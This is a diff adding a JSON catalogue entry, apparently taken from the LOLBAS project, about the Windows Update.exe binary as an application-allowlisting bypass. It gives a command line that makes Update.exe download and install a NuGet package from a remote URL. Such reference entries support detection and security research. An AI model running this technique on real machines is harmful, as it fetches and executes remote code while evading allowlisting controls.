@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-update-exe-awl-bypass-3",
+  "name": "LOLBAS · Update.exe (AWL Bypass) #3",
+  "command": "Update.exe --updateRollback={REMOTEURL}",
+  "description": "The above binary will go to url and look for RELEASES file, download and install the nuget package.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "update",
+    "awl-bypass"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Update/",
+  "upstream_id": "Update.exe/AWL Bypass/2",
+  "category": "lolbas",
+  "subcategory": "awl-bypass",
+  "references": [
+    {
+      "title": "LOLBAS — Update.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Update/"
+    }
+  ]
+}
